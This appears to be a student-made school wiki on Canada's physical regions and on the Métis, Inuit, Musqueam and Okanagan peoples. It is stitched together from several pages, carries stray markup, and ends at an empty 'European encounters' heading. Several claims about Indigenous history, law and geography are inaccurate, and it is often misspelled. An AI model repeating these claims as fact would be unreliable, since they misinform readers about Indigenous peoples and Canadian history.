In the 17th and 18th centuries there were two groups of Métis - one English speaking and one French speaking. Both originated during the fur trade of the 17th and 18th centuries. The English and Scottish traders and trappers of the Hudson’s Bay Company and Northwest Company often married women of indigenous nations, especially the Cree and Ojibwa.  The Métis lived near Hudson Bay trading posts, often working there.  At first the Métis people were not respected very well and often had to take low paying jobs with the Hudson Bay Company.  These people lived originally in the Canadian Shield, a large region of central and eastern Canada that is drained by rivers flowing into Hudson Bay. French fur traders also married the native peoples in the prairies as well, making the origin for the French speaking Métis population. The French-speaking Métis populations developed in two main areas—the Old Northwest (which is now the American Midwest) and Canada. 
In the Old Northwest, they were the principal entrepreneurs in the fur trade. Some of the fur trade posts they established became great cities, such as Detroit and Chicago. In the early 19th century, the French-speaking Métis in the Old Northwest either moved out or were absorbed into the culture of the American farmers who moved into the area. In Canada the French-speaking Métis lived in the prairies and in southern regions of the Canadian Shield, where they overlapped somewhat with the English-speaking Métis. Métis identity as a separate nation began to take shape during conflicts with the Red River colony, a farming community established on the Red River south of Lake Winnipeg in 1812. By this time the hunting of buffalo was a major part of the Métis economy, and the Métis feared that new settlers to their land would result in them not being able to hunt the buffalo. Action was taken by certain individuals to ensure that the Métis people would have a voice on the red river region and economy.  The Métis also had a large part to play in the Red River Rebellion. At the end of the rebellion, the Manitoba act was created giving the Métis freedom to live in their lands.

= Territory =

Other treaties also led to Métis freely living in Saskatchewan, Alberta, Manitoba, British Columbia, Ontario, and the North West Territories, North Dakota, North West Minnesota and Montana. The Métis largely canoed to get around in their territory through  river and lakes systems. 

= Food and hunting =

The Métis lived primarily off of buffalo that lived in the prairies and also other deer and wildlife that they could trap or shoot.  They also fished in the rivers and lakes, and picked berries and other vegetation. The Métis usually hunted bison with bows and arrows or they stampeded down cliffs on them. Their main food was pronghom antelope, moose, elk, mule deer, prairie bush rabbits and wild birds. They usually fished salmon, trout and pickeriel. Usually Métis women gathered berries too, and they were added to special meals.

= Religion = 

The Métis got their religion from the settlers that came to their land.  The English speaking Métis primarily followed Protestant Christianity, and the French speaking Métis primarily followed catholic Christianity.  Since the Métis people were made from European settlers, they don’t really have native religion like some of the other first nation peoples.

= Identity =

There is a large amount of controversy over the definition of a Métis, and who qualifies and should be recognized as a Métis. The only three factors used to legally identify a Métis are:
·         self-identification;
·         ancestral connection to a historic Métis community;
·         community acceptance. 

When the term was first created, ‘Métis’ referred to descendants of a marriage between one partner of Cree descent and another of French. Most often, it also referred to the descendants of the French Catholic Red River Métis. However, over time, the term Métis has come to refer also to those of other European and Native descent as well.

It has been debated whether the term 'Métis' should refer to people of only Cree and French descent, or of all descendants of Native and European marriage. As a compromise, 'métis', with a lower case 'm', is used to describe those of European and Native blood, while 'Métis' is used to describe those of French and Cree descent.

      <text xml:space="preserve">= Geography of the Lands =

Canada is the second largest country in the world, encompassing 9,970,610 km² of land. It is surrounded by three oceans, the Arctic, the Pacific, and the Atlantic.  Canada is comprised of 10 provinces and 3 territories, the provinces all lying in the South, and the territories in the North.  Canada’s climate is fairly moderate, with temperate weather to Arctic conditions in the North. It also has a mild terrain, generally having flatlands, with mountainous areas in the West, and lowlands in the East. There are 8 physical regions in Canada, the Appalachian Region, the Coastal Plains, the Great Lakes-St. Lawrence Lowlands, the Interior Plains, the Canadian Shield, the Western Cordillera, the Intermountain Region, and the Arctic. When Europeans came to Canada, they altered the physical environment, changing the wilderness to a more urban setting.

= Coastal Plains =

== Overview == 
The Coastal Plains are a low-land area along the East coast. It is separated from the inland by other features (mountains, rivers)It is roughly 3200km long, and 50-100km wide.

== Topography ==

Consists of flat or gently rolling hills. As well, swamps and marshes are common because most of the land is between 30 and 200m above sea level. The Mississippi Delta is found in the gulf of the Coastal Plains. It creates a great stretch of fertile land. Rivers carry sediment across the plains. This sediment is either; left behind in places and eventually forms floodplains, or carried to and left in river mouths/shallow water and form deltas.

== Climate ==

The climate in the coastal plain region varies greatly.In the North there are long and snowy winters, and hot, humid summers. In the South, there is a sub-tropical climate, with mild- warm winters. There are also hurricanes from late summer to early winter, violent storms with winds between 120 and 240km/hr, formed over large bodies of water.

== Vegetation ==

The soils in the Coastal Plains region are extremely sandy; therefore the plants that grow there adapt to that environment.There are a variety of species in the Coastal Plains The land was originally pine forests, but in some places, such as Mexico, lush rainforests have grown. 

= Interior Plains =

== Overview ==

The Interior Plains are very diverse, and one of the biggest regions. It also includes the &quot;Tornado Alley&quot;, in the central area of North America. It extends northwards to the Arctic, and goes south to Mexico.

== Topography ==

Elevations are separated by escarpments (a sharp change in elevation). The elevation gently rolls downward from west to east. The height of the land changes from 600 to 1500 meters above sea level.

== Climate ==

The climate of the Interior Plains is very diverse. Weather is very extreme; up north, long winters and summers are short and cool, and down south, summers are long and hot and winters are cold, however there is very little precipitation. Air from the Gulf of Mexico flows north, colliding into air from Canada, creating sudden and violent weather, such as tornadoes, blizzards, and hailstorms. 

== Vegetation ==

Much diversity as with climate; up North is Tundra, which is treeless area where the ground is always frozen, and down south there are deciduous and evergreen trees. In the Prairies there are tall grasses and even some that can grow to the height of a person.

= Canadian Shield =
== Overview ==

The Canadian Shield is more than 2 billion years old. It contains volcanic mountains levelled by erosion. The Canadian Shield covers Labrador, the Great Lakes, and the Interior Plains of Canada, and surrounds Hudson Bay and James Bay. It has valuable mineral deposits easily found due to glaciers stripping the top layer of the land.  

== Topography ==

There is barren rock left behind by glaciers in the Ice Age. Glacier debris dammed up rivers and forced changes in the direction of their flow, resulting in a chaotic pattern of rivers, lakes, swamps, and muskegs, also known as bogs. Elevation ranges from 100 to 500 metres above sea level. The elevation is low in the centre and north, but higher in the south. Hudson’s Bay and James Bay are clay-covered lowlands, with rivers flowing in.

== Climate ==

In the North there are long, cold winters, and short, cool summers.

== Vegetation ==

Boreal forest is the common vegetation. Flora in the Canadian Shield is more suited to the thin, sandy soil. There are some deciduous trees, which benefit the pulp and paper industry due to being small and weak. There are no trees above tree-line due to; the growing season being too short, lack of precipitation, and permafrost.&lt;/u&gt;

=The Arctic Islands=

The Arctic Islands is the northernmost region of earth and generally considered to be all areas above the Arctic Circle (66° 33’N). It encompasses parts of Canada, the US, Russia, Scandinavia and the whole of Greenland.  

The Arctic Islands is a formidable place of bitter cold and barren lands. During the winter, its landscape is dominated by 15 million square kilometres of polar sea ice, extending between the Atlantic and the Pacific oceans. This is reduced to six million square kilometres during the summer. Massive glaciers, such as the 2.8 million cubic kilometres of the Greenland Ice Cap, inhabit the Arctic’s northern mountains and surround the Arctic Ocean. 

Arctic Islands climate and vegetation varies greatly between regions. The Innuitian Region, a triangular shaped area mainly comprised by the Queen Elizabeth Islands, is mountainous and presently covered by glaciers. It contains the great Innuitian Mountains, composed of three ranges. In contrast, the Arctic Region consists largely of tundra (very flat lowlands). Trees cannot withstand the tundra’s low precipitation, harsh temperatures, and nutrient-poor soil, frozen with permafrost. Instead, short plants such shrubs, lichens, grasses, and 400 flower varieties sprout during this area’s 50-60 day growing season. Arctic plants are adapted to cold temperatures and a very short growing season. They grow rapidly in spring and remain short and clustered, sheltering each other, to survive harsh winds. 
 
Because of the Arctic Islands' distance from the equator, the climate is very cold and there are large differences between both solstices. For part of the year, the sun either never rises or never sets. During the 10-month winter, the average Arctic temperature is – 40° C. This rises to an average of 3 to 12° C in the summer. Most areas in the Arctic receive less than 50 cm of rain per year, making this region a desert.

= Western Mountain Region =

==Overview==
The Canadian Western Mountain Region is one of Canada's most ecologically diverse regions.

The Western Mountain Region is an area that lies between the Rocky and Coast Mountains. This region is thinly populated. It consists of some deserts, high plateaus, and mountains. Many of the rivers in this area flow into somewhat salty lakes. There are only a few areas suitable for agriculture.The habitat ranges from moist coniferous forests to desert. This diversity supports a strong resource economy and abundance of wildlife. The forestry, agriculture, and mining industries, as well as the energy sector and tourism, have created a high quality of life for the region, and provide benefits elsewhere. This prosperity, however, has come with considerable land development and conversion. The Canadian Intermountain is a landscape of varying elevation and climate that has resulted in a tremendous diversity of habitat types, including desert, grasslands, shrub-steppe, riparian, wetlands, dry and moist coniferous forests, and alpine tundra. Since there are enormous variations in climate and vegetation, there are many different kinds of animals, ones that can survive in dry, desert areas, others that can live in wet, rain forests and other that habituate high mountain altitudes.

==Eastern Border: The Rocky Mountains==

The high jagged peaks of the Rocky Mountains are due to that they are not very eroded down yet, for they are still young -- for mountain ranges. They are twice as high as the Appalachian Mountains. Signs of alpine glaciations are widely evident and in many places valley glaciers remain active. The alpine tundra is too harsh for trees, yet plants and animals nestle near the ground. Although harsh in climate, there are hot springs occasionally dotting the mountains. In the subalpine area, trees are small and stunted, mostly fire and cold tolerant conifers. The bent and gnarled bodies of spruce and fir trees tell the story of hard summers and harder winters near the mountain tops.                                                                      

==North Interior:==

The lower region has three mountain ranges (the Columbias, the Selkirks and the Purcells) and is bordered by two others (the Monashees and the Rockies), making it a land of peaks and valleys connected by rivers and lakes. Climate conditions vary according to the nearness to water. The geography creates rain shadows where one side of a mountain may get a lot of rain or snowfall and the other side gets little or none. It also creates micro-climates, where temperatures may be warmer in valleys than at higher elevations. The winters are snowy and summers warm. The average temperature in winter is -10 °Celsius, and in summer it is 20 °C. In the southern part of the region summers are warmer and drier, with temperatures climbing to 30 °C. The average snowfall in the southern part of the region is about 170 centimetres, or 67 inches, and in the northern part it is about 200 cm, or 80 inches. The valleys to the west Grand Forks and to the east Cranbrook are considered semi-arid, because they get less precipitation than the mountains and other valleys in the region.

In the higher region, the climate consists of light precipitation, freezing winters and cool summers with long days. In the northern reaches of this region temperatures range from -13 degrees Celsius in winter to 19 °C in summer. 

==Mid-Interior: Wet forests and high plateaus==

There are forests of both coniferous and deciduous trees thriving in the moderate climate. Trees such as Douglas fir, western hemlock, western red cedar, yellow cedar, white spruce, lodgepole and Ponderosa pine, birch grow in great variety because of the long growing seasons and temperate climate. Geographically positioned in the centre of the province on a high plateau and surrounded by mountains,the summers are dry and warm and there is much snowfall in the winter. Temperatures range from -15 degrees Celsius in winter to 22 ° Celsius in summer. While some areas are sheltered and do not receive much rain and snow, the mountains will receive high amounts, especially at higher elevations.

==South Interior: Desert==

The rain shadow effect greatly reduces the rain fall of the in the leeward slopes: the deserts. The rain shadow means the moist air (heavy cloud) wrings itself out on the windward side of the mountain because of condensation, and when the moist air gets to the leeward side, the opposite happens because the warmer air on that side can hold more moisture before having to dump it. The leeward side is warmer, therefore able to hold more moisture. The Thompson Okanagan Region has a plateau in the centre, and is bordered by the Cascade mountains to the west, the Cariboo mountains to the north and the Monashee and Selkirk mountains to the east. The south is dry, but the climate cools and becomes wetter heading north. This region has a four-season climate with less precipitation and more moderate winters than many other areas of the province. The summers in this region are warm, reaching 30 degrees Celsius or higher. Rainfall amounts vary from one part of the region to another, but the average annual precipitation in the valleys is about 280 millimetres. Winters are snowy, with cool temperatures that average -7 °C. Spring and fall are with warm days and cool nights because of the desert area. This region enjoys warm days and cool nights from May to September, and mild winter temperatures from November until April. The mountain ranges receive abundant snow in winter. The dry conditions in the southern part of the region create a true desert in the area around the city of Osoyoos.

==Wildlife and Vegetation of this Region:==

Plants in the ecozone are as varied as the landforms they grow on. Vegetation that may be common in one area are often completely absent from another. Trees in the area include Engelmann spruce, alpine fir, interior Douglas fir, lodgepole pine, western white pine, Rocky Mountain ponderosa pine, trembling aspen, western hemlock, Rocky Mountain red cedar, balsam poplar, paper birch, black spruce, white spruce, and western larch. Some of the other species found here are sagebrush, rabbitbrush, antelope-bush, mountain avens, bunchgrass, pine grass, and bluebunch wheat grass.

The large herbivores include caribou, mule deer, white-tailed deer, moose, mountain goat, California bighorn sheep, and American elk. The large carnivores are the black bear, grizzly bear, wolf, lynx, bobcat, and cougar. Some of the small herbivores here are hoary marmot, yellowbelly marmot, Columbian ground squirrel, beaver, golden-mantled squirrel, yellow pine chipmunk, redtail chipmunk, beaver, northern bog lemming, and pika. Small carnivores that are found here include coyote, red fox, marten, wolverine, muskrat, badger, marten, mink, pallid bat, and striped skunk.

Birds of prey such as northern saw-whet owl, short-eared owl, long-eared owl, burrowing owl, cooper's hawk, red-tailed hawk, sharp-shinned hawk, northern goshawk, and turkey vulture are found here. The shorebirds and seabirds of the area include long-billed curlew, spotted sandpiper, American bittern, common snipe, killdeer, and black tern. Songbirds of the Montane Cordillera include Stellar’s jay, black-billed magpie, sage thrasher, white-throated swift, red-winged blackbird, cedar waxwing, cassin's finch, house finch, purple finch, brown creeper, and American dipper.

Fish species that live in the ecozone include lake whitefish, chiselmouth, lake chub, peamouth, leopard dace, and redside shiner. White sturgeon and sockeye salmon both come to freshwater to spawn.

Molluscs found here include pig-toe, western-river pearl mussel, western floater, and arctic-alpine fingernail clam.

A few of the insects that live here are red turpentine beetle, boreal spittlebug, spring azure, mourning cloak, and migratory grasshopper.

= The Great Lakes and St. Lawrence Lowland =

The great lakes and the St. Lawrence Lowland are a small region in eastern Canada spanning the provinces of Ontario and Quebec. They were created by glacial movement during the last Ice Age.  This region is the smallest in North America, only 180,000 sg. km. 

== Topography ==
The Great Lakes and the St. Lawrence Lowland have a rolling landscape created when the glaciers retreated and corroded the landscape. Elevation varies from 100 to 400 metres above sea level. 
The St Lawrence Lowland has flat plains on either side of the St. Lawrence river. These flat plains rise into the Canadian Shield and the Appalachians Although it is small, it is the home of Canada's most populated cities/area, Toronto, Montreal and Ottawa. The Great Lakes are Canada's biggest source of fresh water, however, it is contaminated from surrounding cities.

== Climate ==
The great lakes region is very humid because of the Great Lakes. They store heat in the winter and cold in the summer.This climate allows for good growing season for crops.On average, around 100 cm of rain or snow is received every year.Winters get down to -30 degrees and up to 35 degrees in the summer

== Vegetation ==
The long growing season and fertile lands left over from the glacier allow for lots of crops and fruit to be grown.  Some of the crops grown in Western Ontario and Southern Quebec are tobacco, peaches, cherries, grapes , apples, hay, vegetables, such as carrots, corn, onions, beets, peas and beans. St Lawrence Lowland has lots of ranching which supply butter, cheese and meat for the region. The Great Lakes are home to a broad leaf forest, and the Lowland has a mixed forest of conifers and deciduous. Grass is also plentiful. Although not vegetation, fresh water is also a huge resource to the Great Lakes region.

= The Appalachian Highlands of Canada =

The Appalachian Highlands of Canada is a vast, mountainous area along the east coast. Some of the oldest fold mountains in the world (created by colliding plates) traverse the land in an almost unbroken line. The region extends through Newfoundland, New Brunswick, and Nova Scotia.

==Climate==
 
The Appalachian Highlands climate is controlled by two major ocean currents.  The Arctic sends cold water south through the Labrador Current, bringing freezing winter temperatures to the Northern areas. Warm Caribbean water is propelled through the Gulf Stream to the coast of North America by before diverging towards Europe. The meeting of these two water bodies – warm and cold- offers an abundance of plankton and microscopic organisms, encouraging the growth of fish populations. In colonial days, the multitude of fish found in the Appalachian Region was a chief attraction for colonization. Although chronic over fishing has virtually eliminated many of these stocks, the Appalachians still boast a diversity of species sustained by the converging currents and climates. 
 
==Geography==
          
The stunning Appalachian Highlands scenery is diverse, containing mountains, river valleys, parallel ridges, and volcanic rock. Many years of erosion have reduced the once jagged and steep mountains to low, rolling hills. Early colonization was slowed by this natural barrier. Rivers crisscross the hillsides, providing easy transportation. This network of waterways was once a beckon for settlement. Agriculture flourishes in the fertile plateaus and valleys. Deep in the sedimentary layers of the rock, vast reserves of oil, gas, and coal can be found. These reserves continue to be discovered and exploited.

==Flora and Fauna==

A wide range of vegetation and animals can be sighted in the Appalachian Highlands of Canada. Mixed forests include deciduous and coniferous trees. Star flowers, violets, aspens, mountain ashes, red spruces, white pines, hemlocks, apple trees and sugar maples dot the land. Hidden amongst the forests and waters, many species such as bears, moose, beavers, red wing black birds, white tailed deer, blue jays, raccoons, and eastern bluebirds peek out in existence. Rich in flora and fauna, the Appalachian Highlands are a largely fertile and productive region.

      <text xml:space="preserve">== The Prairies ==

Rupert's Land, now called Manitoba and North Dakota, was a 300,000 square kilometer designation. This land was given to Lord Selkirk by the H.B.C. to supply food. However, the Scottish settlers had many conflicts with the Metis.  The Metis felt that the settlers were on their land.  In order to keep the Métis at bay, the John A. McDonald government decided that Manitoba would be allowed to be a province under specific conditions. Manitoba was founded as a province with the heavy influence of Louis Riel.  He proposed Manitoba be created for the Métis, and the government obliged with the Manitoba act in 1870. The Métis were to receive title to all the land they had already farmed and an additional 5,700Km2 so their children could live on the same soil. However, McDonald then laid the foundation for a military expedition to the new founded “province” of Manitoba to control the Métis. This allowed white settlers to displace the Métis who were still waiting for the deeds to their land grants. In the same year, Riel was exiled from Canada and fled to the United States. This left the Métis without a leader. After much abuse and being subject to discrimination, the Métis fled westward into what is now Saskatchewan and Alberta.  

The few Métis that stayed in Manitoba, were subject to oppression and deception. the province of Manitoba was settled  by Europeans more  who relied heavily on the land for their food and meager economy. When Europeans saw the vast areas of fertile land in Manitoba, they were committed to finding a way to get this land for their farms and towns. In 1876, the Indian Act was published and treaty-making began. The Indian Act described an official way of trading with the native populous of Canada. Under the conditions of the Indian Act, Europeans were banned from taking land that natives owned and told to plan meetings between the natives and the European settlers if there was any trading or selling  to be done. Unfortunately ,the rules set out by the treaties were rarely followed. This left the native peoples in an unfavorable state as they had little choice but to honor treaties as they had no resources to fight the Europeans with.

      <text xml:space="preserve">Inuit refers to a large aboriginal group that live in the Arctic Regions. The Arctic is definitely a challenging climate to live in, long, bitter winters and short, cool summers. However,the Inuit have been doing it for a extraordinarily long time; this native group can trace their ancestry back to thousands of years BCE. They are also wrongly referred to as Eskimos.
 
The Inuit people are not actually considered to be part of &quot;The First Nations.&quot; This term usually refers to the other indigenous people of Canada. The Inuit are included under the Constitution Act (1982) as Aboriginal peoples of Canada however.
 
== Early History ==

The Inuit's history was first recorded when they conquered the previous people, the Tuniit, when they started moving east from Alaska, across the Arctic Circle at around 1000 AD. The Inuit reached the Atlantic Ocean around 1400 AD. They had an advantage over the other groups who had settled in the region because they had dogs and boats. 

Because of the Little Ice Age happening around 1408 AD, the Inuit were forced to move to souther Greenland in search of food. By that time, the Inuit were struggling with their main way of living. The weather made it too icy to hunt whales in the northern Arctic, and they could not afford to live in houses of sod like they had before. Instead, they were forced to travel farther and farther down south and had to live in tents and igloos for most of the time. By 1500 AD, the Inuit had reached southern Labrador, and started their new life.


== Diet ==

The Inuit regularly hunted, fished, and gathered their food. Tribes that lived on the coast depended more on seals, walrus and whales, whereas inland tribes hunted more caribou and musk-ox. Both tribes ate fish. They consumed a diet high in meat because it kept them warm, strong, fit, and healthy. Another reason was that they had no choice, for vegetation was extremely limited in the Arctic and trees were hardly taller than shrubs. 
 
Every part of an animal was carefully used, including the fat. This fat was collected and used for oil in soapstone lamps. These lamps were essential for heat and light, however, soapstone lamps were hard to cook with and meat was generally eaten raw and/or frozen. The Inuit ate two meals a day, though these were informal meals and no one was expected to join in, as well as several snacks throughout the day.

The seal was the largest and most important part of the Inuit diet. Inuits ate harp seals, bearded seals, and harbour seals. Seal blubber provided a necessary source of protein and energy. During the winter, these seals were hunted through the ice. When a seal broke the ice to come up for air, they were skilfully harpooned. During the summer months, hunters went out onto the water in kayaks. Inuit hunters strongly believed in a bond between person and seal. The agreement was that seals could only be hunted to feed the hunter's family. 
 
Other sources of protein included walrus, the Bowhead whale, caribou, and (of course) fish. Walruses were hunted in the winter and spring by groups of hunters, for the they were much to large for a single hunter. The Bowhead Whale, one of the largest animals in the world, could feed an entire Inuit community for almost a year. Nothing was wasted- every part of the whale was put to use.

Caribou were one of the few land animals hunted by the Inuit. Hunters had to carefully pursue and spear these animals. Every year, herds of caribou would follow specific migration routes, so they were easy to track. However, these animals only crossed the inland regions twice a year so hunters had to be ready. Hunters would use inuksuit (large, human figures made of stone and used for landmarks) to lure the caribou toward a shallow pit where hunters waited, or lakes and rivers where they were trapped and easy to hunt. This caribou hunt supplied the Inuit with enough meat to last the winter as well as hides and sinew (connective muscle tissue, used for cord and thread) to make clothing with, as well as antlers to make tools with. If the hunt failed or the caribou changed their migration route, the tribes faced potential starvation throughout the winter months.
 
Fish created an important supply of food for both inland and coastal Inuit tribes. The Inuit fished by jigging. Instead of using a hook, they would use a fake fish on their line. The bait was jerked around until other fish came to investigate, and then the fisherman could use his spear to catch the fish.

== Housing ==

In the Arctic, the temperature can drop below -30 degrees Celsius so quality of shelter is extremely important. It most trap heat and resist the weather as best as possible. 
 
During the winter, snow was used to build igloos, dome-shaped houses made of snow. An igloo can be built within an hour by two skilled men working with long knives. These igloos form excellent insulators for people. They are warmed by the body warmth of its occupants as well as seal oil lamp. Even though these homes are not permanent, they are safe, secure and easy enough to rebuild. Inside an igloo were low platforms made of snow and covered with twigs and fur that the people could sleep on.
 
When the snow started to melt in the summer months though, igloos were impossible. Instead, Inuit families moved into tents made of animal skin.

== Clothing ==

The Arctic is a harsh, and extraordinarily cold climate so warm clothing is essential. The Inuit layer parkas, coats, trousers, stockings, and hoods all mostly made of caribou skin. Caribou fur is great for warmth because the each hair is hollow so it traps the air inside, forming an insulator. The inner layer of clothing would be worn with the fur facing outward and the outer layer facing inward to create maximum warmth.  The people wear furry hoods on their heads to keep warm. Sometime babies are even carried in the convenient pouch of a hood to stay warm. Duble boots made from sealskin and mittens made from caribou hide added the finishing touches to the Inuit's winter outfit. These many layers of tough skin and fur provided plenty of warmth.
 
During the cool, Arctic summer, the Inuit wore the same type of clothing and simply removed the outer layer(s).  
 

== Transportation ==
 
The Inuit traveled by komatik, kayak, or umiak. At sea, they used the stars to navigate their way and on land they used landmarks. If these landmarks were inefficient, the Inuit would build inukshucks, tall human like figures made of stone.

When traveling across land, the komatik (also known as the dogsled) was used. It consisted of a light but sturdy sled frame made of either animal bone or wood that was light and could glide across the snow easily. The sled had reins that were attached to about six huskies that pulled the sled. These dogs helped tribes by not only pulling sleds but also guarding villages and using their noses to find the seals.

Kayaks were a one-person boat that was effective for hunting. It glided gracefully and quietly through the water and was waterproof. The passenger steered himself by using a long rod with a paddle on each end.

Umiaks were larger boats they could carry groups of people or families. It was 35-40feet long and covered in animal furs. For its size it as quite light though. Two men could carry its light frame.

== Language ==
The Inuit's language, Inukitut, means &quot;like the Inuit.&quot;
 
It refers to and includes the different dialects spoken by the Inuit across Canada (mostly in Nunavat). Inukitut has even been recognized as an official language in the Northwest Territories and Nunavat.
 
There are roughly 35,000 Inukitut speakers in Canada.
 

== Government ==

Before the Canadian legal system, customary Law was nonexistent in Inuit society. 
 
In 1954 Hoebel concluded that only rudimentary law existed for the Inuit peoples. These laws are as follows:
 
maligait refers to what has to be followed 
piqujait refers to what has to be done 
tirigusuusiit refers to what has to be not done
 

&quot;We are told today that Inuit never had laws or &quot;maligait&quot;. Why? They say because they are not written on paper. When I think of paper, I think you can tear it up, and the laws are gone. The laws of the Inuit are not on paper.&quot;
--Mariano Aupilaarjuk, Rankin Inlet, Nunavut, &quot;Perspectives on Traditional Law&quot;

== Beliefs ==

The Inuit practiced a form of shamanism; they believed all living creatures contained a spirit. These spirits could be pleased by acting in a certain manner and so the people relied upon the Angakkuq in their community. This was not the leader of the tribe but rather a healer or shaman who could give advice, treat wounds, and invoke the spirits inside of people to help them. They had the ability to see and interpret the subtle and unseen. Angakkuqs were not trained for this role, they were simply born with the ability. People strongly believed that the aurora borealis or northern lights were a way of seeing their lost family and friends dancing in the next life. It was their connection with their ancestors.
 
The closest thing the Inuit people had to a deity was the old woman of the sea, called Sedna. Sedna is the underwater goddess of marine animals, especially seals. The sea was believed to contain many great gods as it was such a major source of food.
In order to please the Goddess Sedna, after catching a seal, hunters would remove the bladder of the animal and place it back in the sea.

== Community ==

People in Inuit communities did have different jobs depending on their gender, however it was not always strictly followed. In general, men were expected to hunt and fish whereas women were expected to care for the children, home, clothing, and food.
 
Marriage was common for men once they became successful hunters and for women when they reached puberty. Divorce and remarriage were acceptable however in some communities, consent was needed from the elders. 
 
Some communities believed in patrilineal bonds, meaning a newly wed couple would stay with the man's family and their children would be named after the man's family tree. Before moving in here however, the couple would first live with the woman's family for a year in order to let the husband and father of the bride work together. 
 
The elder males of a family were the leaders and together formed a leading council for the community. They had the important role of passing on believes, history, and stories.
 

== Modern Culture ==

As Inuit societies are thrust into the modern world, they are forced to adjust. Some changes have occurred however traditional storytelling, myths, and dancing still play an important role in the communities. Time spent with family and friends is still highly valued. 

The visual arts have always been highly regarded for the Inuit and it continues to be. In 2002 the first film in Inukitut &quot;Atanarjuat,&quot; was released. Mitiarjuk Attasie Nappaaluk wrote the first published novel written in Inuktitut. 

Many individuals are working to keep this traditional language alive but it is slowly fading away within Inuit societies today. Technology is beginning to play a greater role in the lives of youth causing communication with the elders to be limited. Less and less Inuit people are learning to speak Inuktitut. This loss of language is part of the identity struggle among the younger generations of Inuit today. As youth are exposed to both the culture of their tribe and more and more culture of they rest of the world they begin getting confused as to what to believe, how to live. This has lead to greater suicide rates among the Inuit people.

      <text xml:space="preserve">== The Musqueam  ==
  

The Musqueam – people of the river grass- have flourished and dwindled over the past nine thousand years, just like the river grass. Before the arrival of Europeans, they lived to the rhythm of the land. They fished, hunted, gathered, and trapped for subsistence along the shores of Burrard Inlet, the Mouth of the Fraser, and the borders of English Bay. 
 

== Food ==


The Musqueam enjoyed a varied diet in the prosperous Greater Vancouver area. Salmon, the Musqueam’s staple diet, were caught using specialized equipment like trawl and dip nets and weirs. They were then cooked with hot stones in wooden troughs or smoked for winter. Bows, arrows, nets, and snares were used to catch dear, elk, bear, goat, and birds. Cleverly designed harpoons contained heads tied to lines that separated from the shafts upon contact. These enabled the hunting of seal, porpoise, and sturgeon. Shellfish, edible roots, berries and the wapato (a type of native potato) were gathered and harvested as well. 


== Winter ==


Their vast stores of preserved food allowed the Musqueam to live in comfort during the wet, cold winter. Elders recounted stories before smoldering fires. Ritual dances were performed accompanied by singing and drumming. These dancers often wore feathered costumes or plumed, bug-eyed skhwaykhwey masks. Feasts were savored and a host of games were played. Work that could be performed indoors was also done. Stones, bones, and wood were carved into sacred and utilitarian objects. Clothing was also sewn and objects such as nets repaired. 

 
== Village Structure ==

 

Cedar plankhouses, divided into rooms by mats, served as spacious dwellings for family groups. Outside, totem poles with life sized statues of people, birds, and beasts guarded the homes. Holes carved at the base of these totem poles allowed comings and goings. Separated from the plankhouses, smoke and sweat houses served ritual purposes of cleansing. 


== Trade ==


Trade was an important element of Musqueam life. With neighboring tribes, they traded decorative and ceremonial items - dentalia shells, mother-of-pearl, copper, iron and jade. Foodstuffs, textiles, and domestic materials were also readily exchanged. 


== Class System ==


Kinship patterns dictated the lives of the people, determining a family’s fishing, hunting and gathering rights. At the bottom of the hierarchy, slaves, captured during inter-tribal warfare, performed menial tasks for high ranking chiefs.


== Death ==
 

The Musqueam did not bury their dead. Wrapped in a blanket or mats, the deceased was ceremoniously laid to rest on elevated platforms built on treetops.


== Beauty ==
 

Beauty to the Musqueam was very different from today’s cover girl. Cedar boards were tied to the heads of infants and secured with a strap to the cradle in order to bend the skull into a pointed shape and attain a flat, wide forehead. Men kept their hair cropped at shoulder length. When at war or working, it was pinned in the back. Otherwise, they left it down. Women braided their hair in two from a center part. At puberty, a girl’s hairline was slightly raised through plucking. 
 

== Clothing ==

 
Clothing was fashioned from skins or cedar bark. In the summer, men went about naked while women wore a knee-length skirt of wool, deerskin, or shredded bark. Clothing for cooler weather consisted of a large animal skin, usually with the fur on. A hole was cut in the middle and a belt tied the garment to the waist. Difficult to prepare and rare, buckskin was mostly reserved for the winter dancers. Goat skin, even rarer than buckskin, marked a person’s status. Only the wives and daughters of rich men could afford to wear the aprons produced from this material.

= Region =
The Okanogan people occupy a region spanning 690,000 sq. kilometers form Modern day Revelstoke to Orville Washington, and from the Nicola valley to Kootney lake.  They used the Okanogan and Columbian rivers to transport through their territory.  In 1846, the American tribe branched off in the Oregon Treaty, and although they are officially Okanogan first nations, they have little to do with the Canadian tribes.

= Tribes = 
Westbank First Nation (Kelowna) 
Lower Similkameen Indian Band (Keremeos) 
Upper Similkameen Indian Band (Keremeos) 
Osoyoos Indian Band 
Penticton Indian Band 
Okanagan Indian Band (Vernon) 
Upper Nicola Indian Band (Merritt) - also part of the Nicola Tribal Association 
Conferated Tribes of the Colville (USA)

= Government = 
The Okanogan people have formed the Okanogan Nation alliance, and the American portion managed by the Colville Indian reserve. Tribes in the Okanogan Nation Alliance include the 

= Food = 
The Okanogan people where hunters and gatherers, collecting local berries, fruits, and hunted deer, salmon and rabbit. The lands rivers and lakes proved very popular for hunting, and the fertility it gave produced lots of fruits and vegetables ( i.e. Apples) 

= Hunting = 
Knives or bows and arrows where used to hunt deer, elk, big-horned sheep, caribou, black bear and grizzly bear.  Smaller animals included rabbit, beaver and marmot. young boys hunted squirrel. Spears where used for beaver, and nets and hooks for fish. There where four big hunts every year.  In the spring they hunted for sheep and deer.  In the fall long distances were covered for sheep, elk, bear, and deer.  Sometimes the hunters would be away for two months.  In the middle of winter, another hunt took place for deer, and in the early spring the last hunt was for sheep. 

 

= Shelter =
The Okanagan People used brush wood and animal skins to makes shelters.  They would cover wooden frames with animals skins or bunches of foliage.  in the winter, more animal skins where used. or underground shelters were used.  a shelter would typically had two families, or a hunting party. Their shelters where beside a river in the summer, or near a hinting ground in the winter.

 

= Language =
The official language of the Okanogan people is Syilx, and is spoken in all Okanogan tribes.

= Festivals =
The only main festivals were dinners around an event that consisted of feasting and dancing. Drums and rattles were used for instruments, and although no costumes were used, there was deer rattles tied to the feet and ankles. There were usually four big dances in the year - the war dance, put on before a fight, the scalp dance, where people shared their accomplishments , the guardian spirit dance, where boys became men, and the religious dance.  A sun dance was also performed on the longest and shortest days of the year. 

= Clothing =
The full dress of the men consisted of moccasins, long leggings with belt, breechcloth or apron with shirt, cap or headband.  The women wore moccasins, short leggings, long dresses with cap or headband and sometimes a belt. deer, elk, buffalo, antelope, caribou, and moose were used to make the clothes.

 

= Religion = 
The Okanagan people worshiped land gods who provided them with their land and prosperity.  Sacred to them is Spotted Lake, where medical miracles are said to happen. 

= European encounters = 
